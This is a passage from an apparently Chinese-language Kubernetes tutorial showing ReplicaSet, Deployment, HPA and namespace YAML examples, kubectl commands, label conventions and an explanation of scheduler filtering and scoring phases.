my-rs<br>  <span class="hljs-params">labels:</span> <br>    <span class="hljs-params">controller:</span> nginx-rs<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">3</span>                                      <span class="hljs-comment"># 期望始终有几个 Pod                        </span><br>  <span class="hljs-params">selector:</span>                                        <span class="hljs-comment"># 指定该控制器负责管理哪些标签的 Pod          </span><br>    <span class="hljs-params">matchLabels:</span>                                   <span class="hljs-comment"># 根据 Labels 筛选 Pod               </span><br>      <span class="hljs-params">app:</span> nginx<br>  <span class="hljs-params">template:</span>                                        <span class="hljs-comment"># Pod 模版，用来定义 Pod                 </span><br>    <span class="hljs-params">metadata:</span> <br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">app:</span> nginx<br>    <span class="hljs-params">spec:</span><br>      <span class="hljs-params">containers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> nginx<br>        <span class="hljs-params">image:</span> nginx<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：更强的标签匹配功能该怎么写</p></blockquote><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">spec</span><span class="hljs-punctuation">:                                           </span><br>  <span class="hljs-attribute">selector</span><span class="hljs-punctuation">:                                                        </span><br>    <span class="hljs-attribute">matchExpressions</span><span class="hljs-punctuation">:                                                </span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">key: app</span><br>    <span class="hljs-attribute">operator</span><span class="hljs-punctuation">:</span> <span class="hljs-string">In                                # operator 操作符</span><br>    <span class="hljs-attribute">values</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">my-app</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">another-app</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 RS 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f rs.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 RS 资源状态&#x3D;&#x3D;</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">get</span> rs -n &lt;controller-<span class="hljs-keyword">namespace</span>&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="6-5-Deployment-实战步骤"><a href="#6-5-Deployment-实战步骤" class="headerlink" title="6.5. Deployment 实战步骤"></a>6.5. Deployment 实战步骤</h4><p>&#x3D;&#x3D;1.编写 Deployment 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">apiVersion:</span> apps/v1<br><span class="hljs-symbol">kind:</span> Deployment<br><span class="hljs-symbol">metadata:</span><br><span class="hljs-symbol">  name:</span> nginx-deployment<br><span class="hljs-symbol">  namespace:</span> default<br><span class="hljs-symbol">  labels:</span><br><span class="hljs-symbol">    app:</span> nginx<br><span class="hljs-symbol">spec:</span><br><span class="hljs-symbol">  replicas:</span> <span class="hljs-number">3</span>                             <span class="hljs-meta"># 期望始终有几个 Pod（若使用 HPA，该值会动态调整）</span><br><span class="hljs-symbol">  selector:</span>                               <span class="hljs-meta"># 指定该控制器负责管理哪些标签的 Pod</span><br><span class="hljs-symbol">    matchLabels:</span>                          <span class="hljs-meta"># 根据 Labels 筛选 Pod</span><br><span class="hljs-symbol">      app:</span> nginx<br><span class="hljs-symbol">  strategy:</span>                               <span class="hljs-meta"># 更新策略</span><br><span class="hljs-symbol">    type:</span> RollingUpdate                   <span class="hljs-meta"># 采用滚动更新策略</span><br><span class="hljs-symbol">    rollingUpdate:</span>                        <span class="hljs-meta"># 滚动更新策略配置</span><br><span class="hljs-symbol">      maxUnavailable:</span> <span class="hljs-number">1</span>                   <span class="hljs-meta"># 更新时最多允许几个 Pod 不可用，如1、25%</span><br><span class="hljs-symbol">      maxSurge:</span> <span class="hljs-number">1</span>                         <span class="hljs-meta"># 更新时最多额外创建几个新 Pod，如1、25%</span><br><span class="hljs-symbol">  template:</span>                               <span class="hljs-meta"># Pod 模版，用来定义 Pod</span><br><span class="hljs-symbol">    metadata:</span><br><span class="hljs-symbol">      labels:</span><br><span class="hljs-symbol">        app:</span> nginx<br><span class="hljs-symbol">    spec:</span><br><span class="hljs-symbol">      containers:</span><br>        - name: nginx-container<br><span class="hljs-symbol">          image:</span> nginx:<span class="hljs-number">1.25</span><br><span class="hljs-symbol">          resources:</span>                      <span class="hljs-meta"># 资源限制，容器不能超过该值</span><br><span class="hljs-symbol">            requests:</span><br><span class="hljs-symbol">              cpu:</span> <span class="hljs-string">&quot;250m&quot;</span>                 <span class="hljs-meta"># 资源请求的 CPU 数量，如 <span class="hljs-string">&quot;500m&quot;</span>（0.5核）</span><br><span class="hljs-symbol">              memory:</span> <span class="hljs-string">&quot;128Mi&quot;</span>             <span class="hljs-meta"># 资源请求的内存大小，如 <span class="hljs-string">&quot;512Mi&quot;</span>、<span class="hljs-string">&quot;2Gi&quot;</span></span><br><span class="hljs-symbol">            limits:</span><br><span class="hljs-symbol">              cpu:</span> <span class="hljs-string">&quot;500m&quot;</span>                 <span class="hljs-meta"># 限制资源的 CPU 数量，如 <span class="hljs-string">&quot;500m&quot;</span>（0.5核）</span><br><span class="hljs-symbol">              memory:</span> <span class="hljs-string">&quot;256Mi&quot;</span>             <span class="hljs-meta"># 限制资源的内存大小，如 <span class="hljs-string">&quot;512Mi&quot;</span>、<span class="hljs-string">&quot;2Gi&quot;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：<code>RollingUpdate</code> 更新流程：</p><ol><li>首先创建新的 Pod（基于新的 <code>image</code> 版本）</li><li>等待新 Pod 运行正常（通过探针检测健康状况）</li><li>逐步删除旧的 Pod，直到所有的 Pod 都被替换成新版本</li></ol></blockquote><p>&#x3D;&#x3D;2.创建 Deployment 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f deployment.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Deployment 资源状态&#x3D;&#x3D;</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">get</span> deployment -n &lt;controller-<span class="hljs-keyword">namespace</span>&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="6-6-HPA-实战步骤"><a href="#6-6-HPA-实战步骤" class="headerlink" title="6.6. HPA 实战步骤"></a>6.6. HPA 实战步骤</h4><h5 id="6-6-1-编写-HPA-资源-yaml-文件"><a href="#6-6-1-编写-HPA-资源-yaml-文件" class="headerlink" title="6.6.1. 编写 HPA 资源 yaml 文件"></a>6.6.1. 编写 HPA 资源 yaml 文件</h5><p>&#x3D;&#x3D;1.基于 CPU 使用率&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> autoscaling<span class="hljs-symbol">/v2</span><br><span class="hljs-params">kind:</span> HorizontalPodAutoscaler<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> hpa-cpu<br>  <span class="hljs-params">namespace:</span> default<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">scaleTargetRef:</span><br>    <span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span>                                   <span class="hljs-comment"># 目标 API 版本（Deployment 的 API 版本）</span><br>    <span class="hljs-params">kind:</span> Deployment                                      <span class="hljs-comment"># 目标资源类型，如 Deployment</span><br>    <span class="hljs-params">name:</span> my-deployment                                   <span class="hljs-comment"># 目标资源名称，如 Deployment-name</span><br>  <span class="hljs-params">minReplicas:</span> <span class="hljs-number">2</span>                                          <span class="hljs-comment"># 最小 Pod 数量</span><br>  <span class="hljs-params">maxReplicas:</span> <span class="hljs-number">10</span>                                         <span class="hljs-comment"># 最大 Pod 数量</span><br>  <span class="hljs-params">metrics:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> Resource                                        <span class="hljs-comment"># 指定资源指标</span><br>    <span class="hljs-params">resource:</span><br>      <span class="hljs-params">name:</span> cpu                                           <span class="hljs-comment"># 监控 CPU 资源</span><br>      <span class="hljs-params">target:</span><br>        <span class="hljs-params">type:</span> Utilization                                 <span class="hljs-comment"># 使用利用率模式</span><br>        <span class="hljs-params">averageUtilization:</span> <span class="hljs-number">80</span>                            <span class="hljs-comment"># 当平均 CPU 利用率达到 80% 时触发扩容</span><br></code></pre></td></tr></table></figure><hr><p>&#x3D;&#x3D;2.基于 内存使用率&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> autoscaling<span class="hljs-symbol">/v2</span><br><span class="hljs-params">kind:</span> HorizontalPodAutoscaler<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> hpa-memory<br>  <span class="hljs-params">namespace:</span> default<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">scaleTargetRef:</span><br>    <span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span>                                  <span class="hljs-comment"># 目标 API 版本</span><br>    <span class="hljs-params">kind:</span> Deployment                                     <span class="hljs-comment"># 目标资源类型，如 Deployment</span><br>    <span class="hljs-params">name:</span> my-deployment                                  <span class="hljs-comment"># 目标资源名称，如 Deployment-name</span><br>  <span class="hljs-params">minReplicas:</span> <span class="hljs-number">2</span>                                         <span class="hljs-comment"># 最小 Pod 数量</span><br>  <span class="hljs-params">maxReplicas:</span> <span class="hljs-number">10</span>                                        <span class="hljs-comment"># 最大 Pod 数量</span><br>  <span class="hljs-params">metrics:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> Resource                                       <span class="hljs-comment"># 指定资源指标</span><br>    <span class="hljs-params">resource:</span><br>      <span class="hljs-params">name:</span> memory                                       <span class="hljs-comment"># 监控内存资源</span><br>      <span class="hljs-params">target:</span><br>        <span class="hljs-params">type:</span> Utilization                                <span class="hljs-comment"># 使用利用率模式</span><br>        <span class="hljs-params">averageUtilization:</span> <span class="hljs-number">80</span>                           <span class="hljs-comment"># 当平均内存使用率达到 80% 时触发扩容</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>想要使用内存指标，你必须确保集群中已经安装并正常运行 <code>metrics-server</code></li></ol></blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 检查 metrices-<span class="hljs-keyword">server</span> 是否已安装<br>kubectl <span class="hljs-keyword">get</span> deployment metrics-<span class="hljs-keyword">server</span> -n kube-<span class="hljs-keyword">system</span><br><br><br># <span class="hljs-number">2.</span> 安装 metrices-<span class="hljs-keyword">server</span> <br>kubectl apply -f https://github.com/kubernetes-sigs/metrics-<span class="hljs-keyword">server</span>/releases/download/v0<span class="hljs-number">.6</span><span class="hljs-number">.1</span>/components.yaml<br><br><br># <span class="hljs-number">3.</span> 确认 metrics-<span class="hljs-keyword">server</span> 部署情况<br>kubectl <span class="hljs-keyword">get</span> deployment metrics-<span class="hljs-keyword">server</span> -n kube-<span class="hljs-keyword">system</span><br><br><br># <span class="hljs-number">4.</span> 验证 metrics-<span class="hljs-keyword">server</span> 是否工作正常<br>kubectl top nodes<br>kubectl top pods<br></code></pre></td></tr></table></figure><hr><p>&#x3D;&#x3D;3.基于 自定义指标&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> autoscaling<span class="hljs-symbol">/v2</span><br><span class="hljs-params">kind:</span> HorizontalPodAutoscaler<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> hpa-custom<br>  <span class="hljs-params">namespace:</span> default<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">scaleTargetRef:</span><br>    <span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span>                                <span class="hljs-comment"># 目标 API 版本</span><br>    <span class="hljs-params">kind:</span> Deployment                                   <span class="hljs-comment"># 目标资源类型，如 Deployment</span><br>    <span class="hljs-params">name:</span> my-deployment                                <span class="hljs-comment"># 目标资源名称，如 Deployment-name</span><br>  <span class="hljs-params">minReplicas:</span> <span class="hljs-number">2</span>                                       <span class="hljs-comment"># 最小 Pod 数量</span><br>  <span class="hljs-params">maxReplicas:</span> <span class="hljs-number">10</span>                                      <span class="hljs-comment"># 最大 Pod 数量</span><br>  <span class="hljs-params">metrics:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> Pods                                         <span class="hljs-comment"># 指定 Pod 级别的自定义指标</span><br>    <span class="hljs-params">pods:</span><br>      <span class="hljs-params">metric:</span><br>        <span class="hljs-params">name:</span> requests_per_second                      <span class="hljs-comment"># 自定义指标的名称</span><br>      <span class="hljs-params">target:</span><br>        <span class="hljs-params">type:</span> AverageValue                             <span class="hljs-comment"># 目标类型为平均值</span><br>        <span class="hljs-params">averageValue:</span> <span class="hljs-string">&quot;100&quot;</span>                            <span class="hljs-comment"># 每个 Pod 的指标平均值达到 100 时触发扩容</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>定义 HPA 相对简单，指标可以根据需求自由定义，但真正的挑战在于如何将这些指标暴露给 Kubernetes，以便它能够基于这些指标进行弹性伸缩，这里先不展开。</li></ol></blockquote><hr><h5 id="6-6-2-创建-HPA-资源"><a href="#6-6-2-创建-HPA-资源" class="headerlink" title="6.6.2. 创建 HPA 资源"></a>6.6.2. 创建 HPA 资源</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f hpa.yaml<br></code></pre></td></tr></table></figure><hr><h5 id="6-6-3-检查-HPA-资源状态"><a href="#6-6-3-检查-HPA-资源状态" class="headerlink" title="6.6.3. 检查 HPA 资源状态"></a>6.6.3. 检查 HPA 资源状态</h5><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">get</span> hpa -n &lt;controller-<span class="hljs-keyword">namespace</span>&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="7-K8S-核心概念：Labels"><a href="#7-K8S-核心概念：Labels" class="headerlink" title="7. K8S 核心概念：Labels"></a>7. K8S 核心概念：Labels</h3><h4 id="7-1-Labels-引入的原因"><a href="#7-1-Labels-引入的原因" class="headerlink" title="7.1. Labels 引入的原因"></a>7.1. Labels 引入的原因</h4><p>假设你有一个复杂的系统，包含多个微服务，每个服务有多个 Pod 实例。例如，你的系统有以下服务：<code>web</code>、<code>api</code>、<code>database</code>，每个服务对应多个实例：</p><ul><li><code>web-1</code>、<code>web-2</code>、<code>web-3</code></li><li><code>api-1</code>、<code>api-2</code>、<code>api-3</code></li><li><code>db-1</code>、<code>db-2</code>、<code>db-3</code><br>在传统的管理方式中，你可能只能通过 <strong>Pod 的名称或 ID</strong> 来定位它们，甚至可能需要进入每个 Pod 查看详细信息，这样既麻烦又低效。<br>但如果你在创建 Pod 时 <strong>为它们打上标签</strong>（例如 <code>app=web</code>、<code>app=api</code>、<code>app=db</code>），你就能通过 <strong>标签快速筛选</strong> 出相关的资源，无需逐个查找或进入 Pod，极大地提高了效率。</li></ul><hr><h4 id="7-2-Labels-常见的约定"><a href="#7-2-Labels-常见的约定" class="headerlink" title="7.2. Labels 常见的约定"></a>7.2. Labels 常见的约定</h4><p>尽管标签可以自定义，但我们通常将其与 <code>Namespace</code> 结合使用，并遵循一些常见的约定，具体如下：</p><ol><li>&#x3D;&#x3D;Namespace&#x3D;&#x3D;：<ol><li><code>Namespace</code> 用于隔离不同的环境、团队或应用，每个资源只能属于一个 <code>Namespace</code>。常见的约定包括：</li><li><font color="#00b0f0">隔离环境</font>：<ol><li><code>namespace: env_dev</code>：开发环境</li><li><code>namespace: env_test</code>：测试环境</li><li><code>namespace: env_staging</code>：预生产环境</li><li><code>namespace: env_prod</code>：生产环境</li></ol></li><li><font color="#00b0f0">开发团队</font>：<ol><li><code>namespace: team_tencent</code>：腾讯团队</li></ol></li><li><font color="#00b0f0">应用名称</font>：<ol start="2"><li><code>namespace: app_qqrobot</code>：QQ 机器人应用</li></ol></li></ol></li><li>&#x3D;&#x3D;Labels&#x3D;&#x3D;：<ol><li><code>Labels</code> 用于标识资源的具体业务、版本、角色等，一个资源可以具有多个标签。常见的约定如下：</li><li><font color="#00b0f0">业务</font>：<ol><li><code>bussiness: nginx</code>：负载均衡业务</li><li><code>bussiness: payment</code>：支付业务</li></ol></li><li><font color="#00b0f0">版本</font>：<ol><li><code>version: v1.0</code>：版本 v1.0</li></ol></li><li><font color="#00b0f0">角色</font>：<ol start="2"><li><code>role: batian</code>：开发人员”霸天”</li></ol></li></ol></li></ol><hr><h3 id="8-K8S-核心概念：Namespace"><a href="#8-K8S-核心概念：Namespace" class="headerlink" title="8. K8S 核心概念：Namespace"></a>8. K8S 核心概念：Namespace</h3><h4 id="8-1-Namespace-引入的原因"><a href="#8-1-Namespace-引入的原因" class="headerlink" title="8.1. Namespace 引入的原因"></a>8.1. Namespace 引入的原因</h4><p>Namespace 为不同环境、团队或应用的资源（例如 Pod、Service 等）提供了一个<strong>逻辑分组</strong>，使得资源管理、权限控制和配额设置更加清晰高效。</p><p><font color="#ff0000">需要注意的是，在 K8S 中，一个资源只能归属于一个命名空间，但可以携带多个标签（Labels）。</font></p><hr><h4 id="8-2-Namespace-常见的约定"><a href="#8-2-Namespace-常见的约定" class="headerlink" title="8.2. Namespace 常见的约定"></a>8.2. Namespace 常见的约定</h4><p>尽管 <code>Namespace</code> 可以自定义，但我们通常将其与 <code>Labels</code> 结合使用，并遵循一些常见的约定，具体如下：</p><ol><li>&#x3D;&#x3D;Namespace&#x3D;&#x3D;：<ol><li><code>Namespace</code> 用于隔离不同的环境、团队或应用，每个资源只能属于一个 <code>Namespace</code>。常见的约定包括：</li><li><font color="#00b0f0">隔离环境</font>：<ol><li><code>namespace: env_dev</code>：开发环境</li><li><code>namespace: env_test</code>：测试环境</li><li><code>namespace: env_staging</code>：预生产环境</li><li><code>namespace: env_prod</code>：生产环境</li></ol></li><li><font color="#00b0f0">开发团队</font>：<ol><li><code>namespace: team_tencent</code>：腾讯团队</li></ol></li><li><font color="#00b0f0">应用名称</font>：<ol start="2"><li><code>namespace: app_qqrobot</code>：QQ 机器人应用</li></ol></li></ol></li><li>&#x3D;&#x3D;Labels&#x3D;&#x3D;：<ol><li><code>Labels</code> 用于标识资源的具体业务、版本、角色等，一个资源可以具有多个标签。常见的约定如下：</li><li><font color="#00b0f0">业务</font>：<ol><li><code>bussiness: nginx</code>：负载均衡业务</li><li><code>bussiness: payment</code>：支付业务</li></ol></li><li><font color="#00b0f0">版本</font>：<ol><li><code>version: v1.0</code>：版本 v1.0</li></ol></li><li><font color="#00b0f0">角色</font>：<ol start="2"><li><code>role: batian</code>：开发人员”霸天”</li></ol></li></ol></li></ol><hr><h4 id="8-3-创建-Namespace-资源"><a href="#8-3-创建-Namespace-资源" class="headerlink" title="8.3. 创建 Namespace 资源"></a>8.3. 创建 Namespace 资源</h4><p>&#x3D;&#x3D;1.编写 Namespace 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">apiVersion:</span> v1<br><span class="hljs-symbol">kind:</span> <span class="hljs-keyword">Namespace</span><br><span class="hljs-symbol">metadata:</span><br>  name: my-<span class="hljs-keyword">namespace</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 Namespace 资源&#x3D;&#x3D;</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">kubectl <span class="hljs-keyword">apply</span> -f <span class="hljs-keyword">namespace</span>.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 Namespace 资源状态&#x3D;&#x3D;</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">kubectl <span class="hljs-keyword">get</span> <span class="hljs-keyword">namespace</span> &lt;<span class="hljs-keyword">namespace</span>-name&gt;<br></code></pre></td></tr></table></figure><hr><h3 id="9-K8S-核心概念：K8S-调度器"><a href="#9-K8S-核心概念：K8S-调度器" class="headerlink" title="9. K8S 核心概念：K8S 调度器"></a>9. K8S 核心概念：K8S 调度器</h3><h4 id="9-1-调度器-引入的原因"><a href="#9-1-调度器-引入的原因" class="headerlink" title="9.1. 调度器 引入的原因"></a>9.1. 调度器 引入的原因</h4><p>上面的 <code>Namespace</code> 仅实现了逻辑分区，但不同的 <code>Pod</code> 仍然可能运行在同一台主机上。而调度器的作用在于实现物理隔离，即决定 <code>Pod</code> 应该运行在哪台主机上，以及主机如何主动将 <code>Pod</code> 驱逐。</p><hr><h4 id="9-2-调度器-的调度因素"><a href="#9-2-调度器-的调度因素" class="headerlink" title="9.2. 调度器 的调度因素"></a>9.2. 调度器 的调度因素</h4><p>调度器主要受以下三部分因素的影响：</p><ol><li>&#x3D;&#x3D;节点亲和度&#x3D;&#x3D;：<ol><li>调度器会主动将 Pod 分配到满足特定条件的节点上，即根据节点的特性来选择合适的运行环境。</li></ol></li><li>&#x3D;&#x3D;Pod 亲和度&#x3D;&#x3D;：<ol><li>调度器会将彼此具有亲和关系的 Pod 调度到同一台服务器上，这样可以缩短它们之间的通信延迟，提高整体性能</li></ol></li><li>&#x3D;&#x3D;污点和容忍性&#x3D;&#x3D;：<ol><li>节点不断被赋予污点，如果 Pod 没有相应的容忍度，就无法适应这种环境，最终会被节点主动驱逐。</li><li><font color="#00b0f0">污点（Taints）  </font><ol><li>定义在节点上，为节点“打上污点”，让它显示出不欢迎普通 Pod 的特性。</li></ol></li><li><font color="#00b0f0">容忍度（Tolerations）</font><ol><li>定义在 Pod 上，用来说明该 Pod 能接受节点上的特殊污点，从而允许其在带有污点的节点上运行。</li></ol></li></ol></li></ol><hr><h4 id="9-3-K8S-调度工作流程"><a href="#9-3-K8S-调度工作流程" class="headerlink" title="9.3. K8S 调度工作流程"></a>9.3. K8S 调度工作流程</h4><p>Kubernetes 调度器（kube-scheduler）就好比集群的“大脑”，它不断观察 API Server 的“呼救信号”，将那些还没有座位（即 PodSpec.NodeName 为空）的 Pod 逐一分配到合适的节点上。整个调度过程大致分为三个阶段：</p><ol><li>&#x3D;&#x3D;预选阶段（Predicates）&#x3D;&#x3D;<ol><li>在这个阶段，调度器先像严格的门卫一样过滤掉那些“不符合要求”的节点。比如：</li><li><font color="#00b0f0">PodFitsResources</font>：<ol><li>检查节点是否有足够的资源（CPU、内存、存储等）来满足 Pod 的需求。</li></ol></li><li><font color="#00b0f0">PodFitsHostPorts</font>：<ol><li>检查节点是否存在与 Pod 端口冲突的情况，确保所请求的端口没有被其他 Pod 使用。</li></ol></li><li><font color="#00b0f0">NoDiskConflict</font>：<ol start="2"><li>检查节点上的磁盘是否存在冲突，确保没有磁盘资源冲突。</li></ol></li><li><font color="#00b0f0">CheckNodeDiskPressure</font>：<ol><li>检查节点是否因为磁盘压力（磁盘满了等问题）而不能调度 Pod。</li></ol></li><li><font color="#00b0f0">CheckNodeMemoryPressure</font>：<ol start="2"><li>检查节点是否因为内存压力而不能调度 Pod。</li></ol></li><li><font color="#00b0f0">TaintToleration</font>：<ol><li><font color="#ff0000">检查节点是否有污点（taint）。如果节点上存在污点，调度器会检查 Pod 是否具有与该污点匹配的容忍度（toleration）。如果 Pod 没有匹配的容忍度，则该 Pod 将无法调度到该节点（☆☆☆）</font></li></ol></li><li>如果所有节点都不合适，Pod 就只能站在门口等候（Pending 状态），直到有节点“空出座位”。</li></ol></li><li>&#x3D;&#x3D;优选阶段（Priorities）&#x3D;&#x3D;  <ol><li>通过预选后，调度器会为剩下的节点打分，就像给各个餐桌打分：哪个桌子环境好、资源充足、服务棒？打分高的节点将更有机会获得这个 Pod 的“订单”。常见的优选策略有：</li><li><font color="#00b0f0">LeastRequestedPriority</font>：<ol><li>资源使用越低，得分越高，就像优先安排那些桌子空闲的区域。</li></ol></li><li><font color="#00b0f0">SelectorSpreadPriority</font>：<ol><li>为了高可用，尽量把同一组 Pod 分散在不同节点上。</li></ol></li><li><font color="#00b0f0">ImageLocalityPriority</font>：<ol start="2"><li>如果某个节点上已经下载了需要的镜像，那么“就餐速度”更快，得分自然上升。</li></ol></li><li><font color="#00b0f0">NodeAffinityPriority</font>：<ol><li><font color="#ff0000">根据节点亲和性打分（☆☆☆）</font></li></ol></li></ol></li><li>&#x3D;&#x3D;Binding 阶段&#x3D;&#x3D;  <ol><li>最后，调度器会选择打分最高的节点，并通过绑定操作（binding）把 Pod 安排到这个节点上，最终记录到 etcd 中。随后，该节点上的 kubelet 会监听到 etcd 的变更，并创建 Pod。</li></ol></li></ol><hr><h4 id="9-4-节点亲和度实战步骤"><a href="#9-4-节点亲和度实战步骤" class="headerlink" title="9.4. 节点亲和度实战步骤"></a>9.4. 节点亲和度实战步骤</h4><h5 id="9-4-1-节点硬亲和度"><a href="#9-4-1-节点硬亲和度" class="headerlink" title="9.4.1. 节点硬亲和度"></a>9.4.1. 节点硬亲和度</h5><p>节点必须满足这个条件，否则 Pod 就不会被安排在这个节点上</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> v1<br><span class="hljs-params">kind:</span> Pod<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> <span class="hljs-keyword">with</span>-required-nodeaffinity<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">affinity:</span>                                                            <span class="hljs-comment"># 配置 亲和性</span><br>    <span class="hljs-params">nodeAffinity:</span>                                                      <span class="hljs-comment"># 配置 节点亲和性</span><br>      <span class="hljs-params">requiredDuringSchedulingIgnoredDuringExecution:</span>                  <span class="hljs-comment"># 配置 节点硬亲和性</span><br>        <span class="hljs-params">nodeSelectorTerms:</span>                                             <span class="hljs-comment"># 定义匹配节点的规则</span><br>          <span class="hljs-operator">-</span> <span class="hljs-params">matchExpressions:</span>                                     